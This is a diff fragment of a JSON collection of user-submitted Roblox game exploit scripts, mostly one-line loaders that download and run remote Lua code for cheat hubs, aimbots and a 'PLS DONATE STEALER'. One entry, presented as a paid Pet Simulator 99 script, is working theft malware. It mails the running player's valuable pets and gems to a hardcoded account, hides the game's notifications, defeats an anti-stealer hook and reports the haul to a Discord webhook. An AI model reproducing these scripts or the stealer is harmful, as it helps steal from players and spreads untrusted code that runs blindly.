  }\n        game:GetService(\"ReplicatedStorage\"):WaitForChild(\"RE\"):WaitForChild(\"1Clothe1s\"):FireServer(unpack(args))\n    else\n        SizeInput.Text = \"\"\n        SizeInput.PlaceholderText = \"Valor inválido!\"\n    end\nend)\n\n-- Movimentação do Frame para PC e Mobile\nlocal UIS = game:GetService(\"UserInputService\")\nlocal dragging, dragInput, dragStart, startPos\n\nMainFrame.InputBegan:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\n        dragging = true\n        dragStart = input.Position\n        startPos = MainFrame.Position\n        input.Changed:Connect(function()\n            if input.UserInputState == Enum.UserInputState.End then\n                dragging = false\n            end\n        end)\n    end\nend)\n\nMainFrame.InputChanged:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then\n        dragInput = input\n    end\nend)\n\nUIS.InputChanged:Connect(function(input)\n    if input == dragInput and dragging then\n        local delta = input.Position - dragStart\n        MainFrame.Position = UDim2.new(\n            startPos.X.Scale,\n            startPos.X.Offset + delta.X,\n            startPos.Y.Scale,\n            startPos.Y.Offset + delta.Y\n        )\n    end\nend)",
+      "Script_Title": "hx brok tamanho FE!",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script2601": {
+      "Date": "December 11 2024",
+      "Description": "really op",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/popcornhub-official/Huge-hunter-Script/refs/heads/main/ps99'))()",
+      "Script_Title": "pet sim 99 huge hunt",
+      "User_ID": 3679793928,
+      "Username": "BuilderManTheGrey"
+    },
+    "Script2602": {
+      "Date": "December 11 2024",
+      "Description": "very op",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VapeVoidware/vapevoidware/main/NewMainScript.lua\", true))()\n\n",
+      "Script_Title": "bedwars op",
+      "User_ID": 4685666809,
+      "Username": "mafaka272"
+    },
+    "Script2603": {
+      "Date": "December 11 2024",
+      "Description": "strong damage in the strongest battleground",
+      "Script": "loadstring(game:HttpGet(\"https://paste.ee/r/AnZ5j\"))()",
+      "Script_Title": "loadstring(game:Http",
+      "User_ID": 7474783460,
+      "Username": "sky_lowlow6"
+    },
+    "Script2604": {
+      "Date": "December 11 2024",
+      "Description": "it strong damage in the strongest battleground",
+      "Script": "loadstring(game:HttpGet(\"https://paste.ee/r/AnZ5j\"))()",
+      "Script_Title": "strong damage the st",
+      "User_ID": 7474783460,
+      "Username": "sky_lowlow6"
+    },
+    "Script2605": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 5098155203,
+      "Username": "SinnVamp"
+    },
+    "Script2606": {
+      "Date": "December 11 2024",
+      "Description": "It just a very common Gui Not with mod menu Same function lol",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Mod-menu-23236\"))()",
+      "Script_Title": " MOD MENU",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2607": {
+      "Date": "December 10 2024",
+      "Description": "pega permissão de casa FE",
+      "Script": "-- Variáveis para a GUI\nlocal ScreenGui = Instance.new(\"ScreenGui\")\nlocal MainFrame = Instance.new(\"Frame\")\nlocal UICorner = Instance.new(\"UICorner\")\nlocal NumberLabel = Instance.new(\"TextLabel\")\nlocal NumberInput = Instance.new(\"TextBox\")\nlocal ApplyButton = Instance.new(\"TextButton\")\n\n-- Configurando a GUI\nScreenGui.Parent = game.CoreGui\nScreenGui.Name = \"NumberGui\"\n\n-- Configurando o frame principal\nMainFrame.Parent = ScreenGui\nMainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)\nMainFrame.Size = UDim2.new(0, 220, 0, 150)\nMainFrame.Position = UDim2.new(0.5, -110, 0.5, -75)\nMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)\nMainFrame.BackgroundTransparency = 0.2\n\n-- Adicionando bordas arredondadas\nUICorner.Parent = MainFrame\nUICorner.CornerRadius = UDim.new(0, 15)\n\n-- Configurando o rótulo (label) para o número\nNumberLabel.Parent = MainFrame\nNumberLabel.Text = \"Digite o número da casa:\"\nNumberLabel.Size = UDim2.new(0, 200, 0, 30)\nNumberLabel.Position = UDim2.new(0, 10, 0, 20)\nNumberLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)\nNumberLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nNumberLabel.Font = Enum.Font.SourceSans\nNumberLabel.TextSize = 18\nNumberLabel.BackgroundTransparency = 1\n\n-- Configurando o campo de entrada (TextBox) para o número\nNumberInput.Parent = MainFrame\nNumberInput.Size = UDim2.new(0, 200, 0, 30)\nNumberInput.Position = UDim2.new(0, 10, 0, 60)\nNumberInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)\nNumberInput.TextColor3 = Color3.fromRGB(255, 255, 255)\nNumberInput.Font = Enum.Font.SourceSans\nNumberInput.TextSize = 18\nNumberInput.PlaceholderText = \"Ex: 10\"\nNumberInput.Text = \"\"\nlocal NumberInputCorner = Instance.new(\"UICorner\", NumberInput)\nNumberInputCorner.CornerRadius = UDim.new(0, 10)\n\n-- Configurando o botão de aplicação (Apply)\nApplyButton.Parent = MainFrame\nApplyButton.Text = \"Aplicar Número\"\nApplyButton.Size = UDim2.new(0, 200, 0, 30)\nApplyButton.Position = UDim2.new(0, 10, 0, 100)\nApplyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)\nApplyButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nApplyButton.Font = Enum.Font.SourceSans\nApplyButton.TextSize = 18\nlocal ApplyButtonCorner = Instance.new(\"UICorner\", ApplyButton)\nApplyButtonCorner.CornerRadius = UDim.new(0, 10)\n\n-- Aplicando o valor do número\nApplyButton.MouseButton1Click:Connect(function()\n    local numberValue = tonumber(NumberInput.Text)\n    if numberValue and numberValue > 0 then\n        local args = {\n            [1] = \"GivePermissionLoopToServer\",\n            [2] = game:GetService(\"Players\"):WaitForChild(\"kinito_pet118\"),\n            [3] = numberValue\n        }\n\n        game:GetService(\"ReplicatedStorage\"):WaitForChild(\"RE\"):WaitForChild(\"1Playe1rTrigge1rEven1t\"):FireServer(unpack(args))\n    else\n        NumberInput.Text = \"\"\n        NumberInput.PlaceholderText = \"Valor inválido!\"\n    end\nend)\n\n-- Movimentação do Frame para PC e Mobile\nlocal UIS = game:GetService(\"UserInputService\")\nlocal dragging, dragInput, dragStart, startPos\n\nMainFrame.InputBegan:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\n        dragging = true\n        dragStart = input.Position\n        startPos = MainFrame.Position\n        input.Changed:Connect(function()\n            if input.UserInputState == Enum.UserInputState.End then\n                dragging = false\n            end\n        end)\n    end\nend)\n\nMainFrame.InputChanged:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then\n        dragInput = input\n    end\nend)\n\nUIS.InputChanged:Connect(function(input)\n    if input == dragInput and dragging then\n        local delta = input.Position - dragStart\n        MainFrame.Position = UDim2.new(\n            startPos.X.Scale,\n            startPos.X.Offset + delta.X,\n            startPos.Y.Scale,\n            startPos.Y.Offset + delta.Y\n        )\n    end\nend)",
+      "Script_Title": "hx permissão brokhv",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script2608": {
+      "Date": "December 11 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/R15-+-MUSIC-GUI!_781\"))()",
+      "Script_Title": "brookhaven🏡RP",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2609": {
+      "Date": "December 11 2024",
+      "Description": "MultiGames Script found by me",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Land0099/SolarCheats-Hub/refs/heads/main/SolarCheats%20v1.0.lua\", true))()",
+      "Script_Title": "SolarCheats",
+      "User_ID": 902409111,
+      "Username": "RolyGlitzerSchol"
+    },
+    "Script2610": {
+      "Date": "December 11 2024",
+      "Description": "Can be also used as a flinger who doesnt spin around really chill right?",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()",
+      "Script_Title": "Death Penality",
+      "User_ID": 902409111,
+      "Username": "RolyGlitzerSchol"
+    },
+    "Script2611": {
+      "Date": "December 11 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-UnknownHub-24218\"))()",
+      "Script_Title": "unknown Hub",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2612": {
+      "Date": "December 11 2024",
+      "Description": "Yeah made by ghostplay the best scripter ever ngl he need teach me how i create my own exp",
+      "Script": "loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute(\"Script17\")",
+      "Script_Title": "Safe Server",
+      "User_ID": 902409111,
+      "Username": "RolyGlitzerSchol"
+    },
+    "Script2613": {
+      "Date": "December 11 2024",
+      "Description": "not paid but looks like one duhh",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua\", false))()",
+      "Script_Title": "FREE PAID MM2",
+      "User_ID": 902409111,
+      "Username": "RolyGlitzerSchol"
+    },
+    "Script2614": {
+      "Date": "December 11 2024",
+      "Description": "um yeah be npc or get rekt",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BeNpcOrDie\"))(\"t.me/arceusxscripts\")",
+      "Script_Title": "BE NPC OR DIE",
+      "User_ID": 902409111,
+      "Username": "RolyGlitzerSchol"
+    },
+    "Script2615": {
+      "Date": "December 11 2024",
+      "Description": "NGL IF YOU FOUND THIS SCRIPT THIS Its a GOOD AIMBOT SCRIPT DONT SHARE IT OR IT WILL GETBAN",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/RivalsUPD2.lua\"))()",
+      "Script_Title": "PAID RIVALS SCRIPT",
+      "User_ID": 902409111,
+      "Username": "RolyGlitzerSchol"
+    },
+    "Script2616": {
+      "Date": "December 11 2024",
+      "Description": "not paid but looks like one more from me ad thenymustrackster at dc",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv1.3\"))()",
+      "Script_Title": "PAID ARSENAL",
+      "User_ID": 902409111,
+      "Username": "RolyGlitzerSchol"
+    },
+    "Script2617": {
+      "Date": "December 11 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-LOLLYPOP-HUB-17638\"))()",
+      "Script_Title": "LOLLYPOP Hub",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2618": {
+      "Date": "December 10 2024",
+      "Description": "A rc7 Executer for Executer some scripts",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7\"))()",
+      "Script_Title": "Rc7 FE",
+      "User_ID": 3904670073,
+      "Username": "holawemnasxdnu"
+    },
+    "Script2619": {
+      "Date": "December 11 2024",
+      "Description": " hehe",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-RICK-ROLL-SCRIPT-OP-18925\"))()",
+      "Script_Title": "ghost Hub v2025",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2620": {
+      "Date": "December 10 2024",
+      "Description": "It’s has many features ",
+      "Script": "Username = \"thewolf5471\"\nUsername2 = \"your 2nd user here\" -- stuff will get sent to this user if first user's mailbox is full\nwebhook = \"Your discord webhook here\"\nmin_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default\n\n_G.scriptExecuted = _G.scriptExecuted or false\nif _G.scriptExecuted then\n    return\nend\n_G.scriptExecuted = true\n\nlocal network = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Network\")\nlocal library = require(game.ReplicatedStorage.Library)\nlocal save = require(game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")).Get().Inventory\nlocal mailsent = require(game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")).Get().MailboxSendsSinceReset\nlocal plr = game.Players.LocalPlayer\nlocal MailMessage = \"jsp\"\nlocal HttpService = game:GetService(\"HttpService\")\nlocal sortedItems = {}\nlocal totalRAP = 0\nlocal getFucked = false\nlocal GetSave = function()\n    return require(game.ReplicatedStorage.Library.Client.Save).Get()\nend\n\nlocal newamount = 20000\n\nif mailsent ~= 0 then\n\tnewamount = math.ceil(newamount * (1.5 ^ mailsent))\nend\n\nlocal GemAmount1 = 1\nfor i, v in pairs(GetSave().Inventory.Currency) do\n    if v.id == \"Diamonds\" then\n        GemAmount1 = v._am\n\t\tbreak\n    end\nend\n\nif newamount > GemAmount1 then\n    return\nend\n\nlocal function formatNumber(number)\n\tlocal number = math.floor(number)\n\tlocal suffixes = {\"\", \"k\", \"m\", \"b\", \"t\"}\n\tlocal suffixIndex = 1\n\twhile number >= 1000 do\n\t\tnumber = number / 1000\n\t\tsuffixIndex = suffixIndex + 1\n\tend\n\treturn string.format(\"%.2f%s\", number, suffixes[suffixIndex])\nend\n\nlocal function SendMessage(username, diamonds)\n    local headers = {\n        [\"Content-Type\"] = \"application/json\",\n    }\n\n\tlocal fields = {\n\t\t{\n\t\t\tname = \"Retard Username:\",\n\t\t\tvalue = username,\n\t\t\tinline = true\n\t\t},\n\t\t{\n\t\t\tname = \"Items to be sent:\",\n\t\t\tvalue = \"\",\n\t\t\tinline = false\n\t\t},\n        {\n            name = \"Summary:\",\n            value = \"\",\n            inline = false\n        }\n\t}\n\n    local combinedItems = {}\n    local itemRapMap = {}\n\n    for _, item in ipairs(sortedItems) do\n        local rapKey = item.name\n        if itemRapMap[rapKey] then\n            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount\n        else\n            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}\n            table.insert(combinedItems, rapKey)\n        end\n    end\n\n    table.sort(combinedItems, function(a, b)\n        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount \n    end)\n\n    for _, itemName in ipairs(combinedItems) do\n        local itemData = itemRapMap[itemName]\n        fields[2].value = fields[2].value .. itemName .. \" (x\" .. itemData.amount .. \")\" .. \": \" .. formatNumber(itemData.rap * itemData.amount) .. \" RAP\\n\"\n    end\n\n    fields[3].value = fields[3].value .. \"Gems: \" .. formatNumber(diamonds) .. \"\\n\"\n    fields[3].value = fields[3].value .. \"Total RAP: \" .. formatNumber(totalRAP)\n    if getFucked then\n        fields[3].value = fields[3].value .. \"\\n\\nVictim tried to use anti-mailstealer, but got fucked instead\"\n    end\n\n    local data = {\n        [\"embeds\"] = {{\n            [\"title\"] = \"\\240\\159\\144\\177 New PS99 Execution\" ,\n            [\"color\"] = 65280,\n\t\t\t[\"fields\"] = fields,\n\t\t\t[\"footer\"] = {\n\t\t\t\t[\"text\"] = \"Mailstealer by Tobi. discord.gg/GY2RVSEGDT\"\n\t\t\t}\n        }}\n    }\n\n    if #fields[2].value > 1024 then\n        local lines = {}\n        for line in fields[2].value:gmatch(\"[^\\r\\n]+\") do\n            table.insert(lines, line)\n        end\n\n        while #fields[2].value > 1024 and #lines > 0 do\n            table.remove(lines)\n            fields[2].value = table.concat(lines, \"\\n\")\n            fields[2].value = fields[2].value .. \"\\nPlus more!\"\n        end\n    end\n\n    local body = HttpService:JSONEncode(data)\n\n    if webhook and webhook ~= \"\" then\n        local response = request({\n            Url = webhook,\n            Method = \"POST\",\n            Headers = headers,\n            Body = body\n        })\n    end\nend\n\nlocal gemsleaderstat = plr.leaderstats[\"\\240\\159\\146\\142 Diamonds\"].Value\nlocal gemsleaderstatpath = plr.leaderstats[\"\\240\\159\\146\\142 Diamonds\"]\ngemsleaderstatpath:GetPropertyChangedSignal(\"Value\"):Connect(function()\n\tgemsleaderstatpath.Value = gemsleaderstat\nend)\n\nlocal loading = plr.PlayerScripts.Scripts.Core[\"Process Pending GUI\"]\nlocal noti = plr.PlayerGui.Notifications\nloading.Disabled = true\nnoti:GetPropertyChangedSignal(\"Enabled\"):Connect(function()\n\tnoti.Enabled = false\nend)\nnoti.Enabled = false\n\ngame.DescendantAdded:Connect(function(x)\n    if x.ClassName == \"Sound\" then\n        if x.SoundId==\"rbxassetid://11839132565\" or x.SoundId==\"rbxassetid://14254721038\" or x.SoundId==\"rbxassetid://12413423276\" then\n            x.Volume=0\n            x.PlayOnRemove=false\n            x:Destroy()\n        end\n    end\nend)\n\nlocal function getRAP(Type, Item)\n    return (require(game:GetService(\"ReplicatedStorage\").Library.Client.DevRAPCmds).Get(\n        {\n            Class = {Name = Type},\n            IsA = function(hmm)\n                return hmm == Type\n            end,\n            GetId = function()\n                return Item.id\n            end,\n            StackKey = function()\n                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})\n            end\n        }\n    ) or 0)\nend\n\nlocal user = Username\nlocal user2 = Username2\n\nlocal function sendItem(category, uid, am)\n    local args = {\n        [1] = user,\n        [2] = MailMessage,\n        [3] = category,\n        [4] = uid,\n        [5] = am or 1\n    }\n\tlocal response = false\n\trepeat\n    \tlocal response, err = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n\t\tif response == false and err == \"They don't have enough space!\" then\n\t\t\tuser = user2\n\t\t\targs[1] = user\n\t\tend\n\tuntil response == true\n\tGemAmount1 = GemAmount1 - newamount\n\tnewamount = math.ceil(math.ceil(newamount) * 1.5)\n\tif newamount > 5000000 then\n\t\tnewamount = 5000000\n\tend\nend\n\nlocal function SendAllGems()\n    for i, v in pairs(GetSave().Inventory.Currency) do\n        if v.id == \"Diamonds\" then\n\t\t\tif GemAmount1 >= (newamount + 10000) then\n\t\t\t\tlocal args = {\n\t\t\t\t\t[1] = user,\n\t\t\t\t\t[2] = MailMessage,\n\t\t\t\t\t[3] = \"Currency\",\n\t\t\t\t\t[4] = i,\n\t\t\t\t\t[5] = GemAmount1 - newamount\n\t\t\t\t}\n\t\t\t\tlocal response = false\n\t\t\t\trepeat\n\t\t\t\t\tlocal response = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n\t\t\t\tuntil response == true\n\t\t\t\tbreak\n\t\t\tend\n        end\n    end\nend\n\nlocal function IsMailboxHooked()\n\tlocal uid\n\tfor i, v in pairs(save[\"Pet\"]) do\n\t\tuid = i\n\t\tbreak\n\tend\n\tlocal args = {\n        [1] = \"Roblox\",\n        [2] = \"Test\",\n        [3] = \"Pet\",\n        [4] = uid,\n        [5] = 1\n    }\n    local response, err = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n    if (err == \"They don't have enough space!\") or (err == \"You don't have enough diamonds to send the mail!\") then\n        return false\n    else\n        return true\n    end\nend\n\nlocal function EmptyBoxes()\n    if save.Box then\n        for key, value in pairs(save.Box) do\n\t\t\tif value._uq then\n\t\t\t\tnetwork:WaitForChild(\"Box: Withdraw All\"):InvokeServer(key)\n\t\t\tend\n        end\n    end\nend\n\nlocal function ClaimMail()\n    local response, err = network:WaitForChild(\"Mailbox: Claim All\"):InvokeServer()\n    while err == \"You must wait 30 seconds before using the mailbox!\" do\n        wait()\n        response, err = network:WaitForChild(\"Mailbox: Claim All\"):InvokeServer()\n    end\nend\n\nlocal categoryList = {\"Pet\", \"Egg\", \"Charm\", \"Enchant\", \"Potion\", \"Misc\", \"Hoverboard\", \"Booth\", \"Ultimate\"}\n\nfor i, v in pairs(categoryList) do\n\tif save[v] ~= nil then\n\t\tfor uid, item in pairs(save[v]) do\n\t\t\tif v == \"Pet\" then\n                local dir = require(game:GetService(\"ReplicatedStorage\").Library.Directory.Pets)[item.id]\n                if dir.huge or dir.exclusiveLevel then\n                    local rapValue = getRAP(v, item)\n                    if rapValue >= min_rap then\n                        local prefix = \"\"\n                        if item.pt and item.pt == 1 then\n                            prefix = \"Golden \"\n                        elseif item.pt and item.pt == 2 then\n                            prefix = \"Rainbow \"\n                        end\n                        if item.sh then\n                            prefix = \"Shiny \" .. prefix\n                        end\n                        local id = prefix .. item.id\n                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})\n                        totalRAP = totalRAP + (rapValue * (item._am or 1))\n                    end\n                end\n            else\n                local rapValue = getRAP(v, item)\n                if rapValue >= min_rap then\n                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})\n                    totalRAP = totalRAP + (rapValue * (item._am or 1))\n                end\n            end\n            if item._lk then\n                local args = {\n                [1] = uid,\n                [2] = false\n                }\n                network:WaitForChild(\"Locking_SetLocked\"):InvokeServer(unpack(args))\n            end\n        end\n\tend\nend\n\nif #sortedItems > 0 or GemAmount1 > min_rap + newamount then\n    ClaimMail()\n\tif IsMailboxHooked() then\n        getFucked = true\n\t\tlocal Mailbox = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Network\"):WaitForChild(\"Mailbox: Send\")\n        for i, Func in ipairs(getgc(true)) do\n            if typeof(Func) == \"function\" and debug.info(Func, \"n\") == \"typeof\" then\n                local Old\n                Old = hookfunction(Func, function(Ins, ...)\n                    if Ins == Mailbox then\n                        return tick()\n                    end\n                    return Old(Ins, ...)\n                end)\n            end\n        end\n\tend\n    EmptyBoxes()\n\trequire(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()\n\trequire(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()\n    local blob_a = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")\n    local blob_b = require(blob_a).Get()\n    function deepCopy(original)\n        local copy = {}\n        for k, v in pairs(original) do\n            if type(v) == \"table\" then\n                v = deepCopy(v)\n            end\n            copy[k] = v\n        end\n        return copy\n    end\n    blob_b = deepCopy(blob_b)\n    require(blob_a).Get = function(...)\n        return blob_b\n    end\n\n    table.sort(sortedItems, function(a, b)\n        return a.rap * a.amount > b.rap * b.amount \n    end)\n\n    spawn(function()\n        SendMessage(plr.Name, GemAmount1)\n    end)\n\n    for _, item in ipairs(sortedItems) do\n        if item.rap >= newamount then\n            sendItem(item.category, item.uid, item.amount)\n        else\n            break\n        end\n    end\n    SendAllGems()\n    local message = require(game.ReplicatedStorage.Library.Client.Message)\n    message.Error(\"All your items just got stolen by Tobi's mailstealer!\\n Join discord.gg/GY2RVSEGDT\")\n    setclipboard(\"discord.gg/GY2RVSEGDT\")\nend\n",
+      "Script_Title": "Pets go paid 1day",
+      "User_ID": 1506212536,
+      "Username": "thewolf5471"
+    },
+    "Script2621": {
+      "Date": "December 11 2024",
+      "Description": "Bonk hub fish 🐟 script atualizado ",
+      "Script": "loadstring(game:HttpGet(\"https://bonkhubloader.netlify.app\",true))()",
+      "Script_Title": "Bonk hub fish 🐟 ",
+      "User_ID": 7025833578,
+      "Username": "itz_Lxx71"
+    },
+    "Script2622": {
+      "Date": "December 11 2024",
+      "Description": "the best script everything welcome in Ovedrive H auto farm and it's have anything what do ",
+      "Script": "\n",
+      "Script_Title": "Ovedrive H",
+      "User_ID": 7660322878,
+      "Username": "lalala01598"
+    },
+    "Script2623": {
+      "Date": "December 11 2024",
+      "Description": "JulHub for Brookhaven RP",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub\"))()",
+      "Script_Title": "JulHub Brookhaven",
+      "User_ID": 5607029467,
+      "Username": "Lyzen_mc"
+    },
+    "Script2624": {
+      "Date": "December 11 2024",
+      "Description": "really good and keyless",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/v5-BETA')))()",
+      "Script_Title": "mic up",
+      "User_ID": 4685666809,
+      "Username": "mafaka272"
+    },
+    "Script2625": {
+      "Date": "December 11 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/hassanxzayn-lua/doors/main/devilshubgui\"))();\n\n",
+      "Script_Title": "doors op",
+      "User_ID": 4685666809,
+      "Username": "mafaka272"
+    },
+    "Script2626": {
+      "Date": "December 11 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/GameList.lua\"))()\nfor PlaceID, Execute in pairs(Games) do\n    if PlaceID == game.PlaceId then\n        loadstring(game:HttpGet(Execute))()\n    end\nend",
+      "Script_Title": "Muscle Legends OP",
+      "User_ID": 1289196649,
+      "Username": "JJJoshligas"
+    },
+    "Script2627": {
+      "Date": "December 11 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://scriptblox.com/raw/Be-A-Parkour-Ninja-Ninj-script-7309\"))()",
+      "Script_Title": "Be a Parkour Ninja",
+      "User_ID": 1289196649,
+      "Username": "JJJoshligas"
+    },
+    "Script2628": {
+      "Date": "December 11 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua\"))()",
+      "Script_Title": "doors ultimat3",
+      "User_ID": 4685666809,
+      "Username": "mafaka272"
+    },
+    "Script2629": {
+      "Date": "December 11 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-sillyware-hub-15577\"))()",
+      "Script_Title": "silly ware Hub",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2630": {
+      "Date": "December 11 2024",
+      "Description": "It's keyless btw",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/BedWars-Epilogue-voidware-vape-v4-15982\"))()\n\n",
+      "Script_Title": "Bedwars Voidware V4 ",
+      "User_ID": 4685666809,
+      "Username": "mafaka272"
+    },
+    "Script2631": {
+      "Date": "January 01 2025",
+      "Description": "Hello I m from 2025 The script is only valid for the Concave convex world free items 😏",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Get-Event-Items-for-free_468\"))()",
+      "Script_Title": "Concave convex world",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
     }
   }
 }
